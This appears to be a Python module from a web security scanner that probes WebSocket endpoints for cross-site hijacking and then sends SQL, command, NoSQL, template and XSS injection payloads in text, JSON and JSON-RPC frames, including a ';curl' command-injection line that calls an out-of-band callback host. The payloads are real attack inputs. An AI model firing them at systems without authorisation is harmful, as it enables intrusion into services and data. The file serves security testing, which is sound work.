"""WebSocket scanner — handshake checks + **message-level injection**.

Two phases:

  1. **Handshake phase** (preserved from the original scanner)
     - Cross-Site WebSocket Hijacking (Origin not validated)
     - Unauthenticated WebSocket endpoint accepts connection

  2. **Message-level injection**
     After a successful handshake, we hold the connection open and fire
     a curated set of message payloads carrying SQLi / RCE / NoSQL / SSTI
     markers. Each is wrapped in three popular WS message shapes:
         a) raw text                             "ping ' OR 1=1-- -"
         b) JSON                                 {"type":"ping","msg":"' OR 1=1-- -"}
         c) JSON-RPC 2.0                         {"jsonrpc":"2.0","method":...}
     For each, we read the next 1–2 frames and look for SQL error /
     command output / SSTI product / OOB callback.

Many bug-bounty programs expose admin/internal commands via WS that
never appear on REST surface — this is where the bugs hide.
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from core.orchestrator import Context


SQL_ERROR_RE = re.compile(
    r"sql syntax|warning:.*mysql|unclosed quotation|sqlite3\.|ora-\d{5}|"
    r"sqlstate|syntax error at or near|pg_query",
    re.I,
)
SSTI_PRODUCT_RE = re.compile(r"\b(?:49|7777777)\b")


def _ws_key() -> str:
    return base64.b64encode(os.urandom(16)).decode()


# ---------- handshake phase -----------------------------------------------

async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    if parsed.scheme not in ("ws", "wss", "http", "https"):
        return findings
    ws_scheme = "wss" if parsed.scheme in ("https", "wss") else "ws"
    ws_url = f"{ws_scheme}://{parsed.netloc}{parsed.path}"
    target_http = url.replace("ws://", "http://").replace("wss://", "https://")
    headers = {
        "Connection": "Upgrade",
        "Upgrade": "websocket",
        "Sec-WebSocket-Version": "13",
        "Sec-WebSocket-Key": _ws_key(),
        "Origin": "https://evil.samaritanx.test",
    }
    ev = await ctx.http.get(target_http, headers=headers, allow_redirects=False)
    sec_accept = ev.response_headers.get("sec-websocket-accept")
    if ev.status == 101 and sec_accept:
        findings.append({
            "category": "websocket",
            "title": f"Cross-Site WebSocket Hijacking — Origin not validated ({ws_url})",
            "severity": "high", "cvss": 7.5,
            "url": ws_url,
            "evidence": "WebSocket handshake (HTTP 101) returned despite a forged "
                        "`Origin: https://evil.samaritanx.test` header. Any third-party site "
                        "can open an authenticated socket on behalf of a victim.",
            "request": f"GET {target_http}\nUpgrade: websocket\nOrigin: https://evil.samaritanx.test",
            "response": str({k: v for k, v in ev.response_headers.items()
                             if k.lower().startswith("sec-")}),
        })
    elif ev.status == 101:
        findings.append({
            "category": "websocket",
            "title": f"Unauthenticated WebSocket endpoint accepts handshake ({ws_url})",
            "severity": "medium", "cvss": 5.3,
            "url": ws_url,
            "evidence": "WebSocket handshake completed without authentication or Origin check.",
            "request": f"GET {target_http}\nUpgrade: websocket",
        })

    # ---------- message-level injection ----------
    if ev.status == 101:
        msg_findings = await _message_injection(ctx, ws_url)
        findings.extend(msg_findings)
    return findings


# ---------- message-level injection --------------------------------------

INJECTION_PAYLOADS = [
    ("sqli_quote",     "' OR '1'='1"),
    ("sqli_time",      "1' AND SLEEP(5)-- -"),
    ("rce_marker",     ";echo SX_WSRCE_OK;"),
    ("rce_oob",        ";curl http://{OOB}/sx;"),
    ("ssti",           "{{7*7}}"),
    ("nosql",          "[$ne]=null"),
    ("xss_basic",      "<svg/onload=alert(1)>"),
]


async def _message_injection(ctx: "Context", ws_url: str) -> list[dict]:
    """Open a real WebSocket, fire injection payloads, look for evidence."""
    try:
        import websockets
    except ImportError:
        return []
    findings: list[dict] = []
    headers = (ctx.session.headers if ctx.session else {}) or {}
    # apply auth cookies as a Cookie header — websockets package accepts dict
    cookies_header = "; ".join(f"{k}={v}" for k, v in (
        ctx.session.cookies if ctx.session else {}).items())
    if cookies_header:
        headers = {**headers, "Cookie": cookies_header}

    # Inject OOB host into payloads if available
    payloads = []
    oob_tokens: dict[str, str] = {}
    for label, p in INJECTION_PAYLOADS:
        if "{OOB}" in p:
            if not (ctx.oob and ctx.oob.registered):
                continue
            tok = ctx.oob.token()
            host = ctx.oob.host_for(tok)
            oob_tokens[label] = tok
            ctx.oob.register(tok, {
                "category": "websocket",
                "title": f"WebSocket message injection — blind {label} (OOB)",
                "severity": "high", "cvss": 8.1,
                "url": ws_url, "parameter": label, "payload": p.replace("{OOB}", host),
                "evidence": f"A WebSocket message ({label}) caused an out-of-band callback — the "
                            "message content is processed by a vulnerable backend sink.",
                "_detection": "oob", "_method": "WS",
                "_request": f"WS {ws_url}  message: {p.replace('{OOB}', host)}",
                "_oob_ref": host,
            })
            payloads.append((label, p.replace("{OOB}", host), tok))
        else:
            payloads.append((label, p, None))

    try:
        async with websockets.connect(
            ws_url,
            additional_headers=headers,
            max_size=2 ** 20,
            open_timeout=8,
            close_timeout=2,
        ) as ws:
            # control latency: a benign message's round-trip. Sleep-based
            # detections must beat this by a wide margin, so a merely slow
            # handler can't false-fire.
            ctrl_t0 = time.perf_counter()
            try:
                await ws.send("ping")
                for _ in range(2):
                    try:
                        await asyncio.wait_for(ws.recv(), timeout=3.2)
                    except asyncio.TimeoutError:
                        break
            except Exception:
                pass
            control_elapsed = time.perf_counter() - ctrl_t0

            for label, payload, tok in payloads:
                # send three message shapes per payload
                shapes = [
                    ("text", payload),
                    ("json", json.dumps({"type": "ping", "msg": payload, "data": payload})),
                    ("jsonrpc", json.dumps({"jsonrpc": "2.0", "id": 1,
                                            "method": "echo", "params": [payload]})),
                ]
                for shape, msg in shapes:
                    t0 = time.perf_counter()
                    # sleep payloads need a read window longer than the sleep
                    # itself, otherwise the timeout hides the delay
                    recv_timeout = 3.2 if label == "sqli_time" else 1.5
                    try:
                        await ws.send(msg)
                        # try to read up to two response frames
                        received = ""
                        for _ in range(2):
                            try:
                                frame = await asyncio.wait_for(ws.recv(), timeout=recv_timeout)
                                received += str(frame)
                            except asyncio.TimeoutError:
                                break
                    except Exception:
                        break
                    elapsed = time.perf_counter() - t0

                    # Detection rules
                    if label == "sqli_quote" and SQL_ERROR_RE.search(received):
                        findings.append(_finding(
                            ws_url, "SQL injection over WebSocket frame",
                            f"sqli/{shape}", payload, received,
                            "SQL error string returned in WebSocket reply", "critical", 9.0))
                        return findings
                    if label == "sqli_time" and elapsed > 4.5 \
                            and elapsed - control_elapsed >= 4.0:
                        findings.append(_finding(
                            ws_url, "Blind SQL injection over WebSocket frame (time-based)",
                            f"sqli/{shape}", payload, received,
                            f"Server delayed {elapsed:.2f}s after sleep payload vs "
                            f"{control_elapsed:.2f}s for a benign control message", "critical", 9.0))
                        return findings
                    if label == "rce_marker" and "SX_WSRCE_OK" in received:
                        findings.append(_finding(
                            ws_url, "OS command injection over WebSocket frame",
                            "marker", payload, received,
                            "Injected echo marker returned in WS reply", "critical", 9.8))
                        return findings
                    if label == "ssti" and SSTI_PRODUCT_RE.search(received) and "{{7*7}}" not in received:
                        findings.append(_finding(
                            ws_url, "Server-side template injection over WebSocket frame",
                            f"ssti/{shape}", payload, received,
                            "Template engine evaluated {{7*7}} in WS frame", "critical", 9.0))
                        return findings
                    if label == "xss_basic" and payload in received:
                        findings.append(_finding(
                            ws_url, "WebSocket message reflects raw HTML (stored-XSS class)",
                            f"xss/{shape}", payload, received,
                            "Raw <svg> payload reflected back over WS — likely stored XSS surface",
                            "high", 7.5))
    except Exception:
        return findings

    # OOB callbacks: registered above — the background poller + finalize sweep
    # emit them via oob.pending_findings(), so we must NOT also self-report here
    # (doing so recorded the same callback twice with two different titles).
    return findings


def _finding(url, title, kind, payload, response, evidence, severity, cvss):
    return {
        "category": "websocket",
        "title": title,
        "severity": severity, "cvss": cvss,
        "url": url, "payload": payload, "evidence": evidence,
        "request": f"WS {url} ← {payload[:120]}",
        "response": (response or "")[:1500],
        "metadata": {"detection": kind},
    }
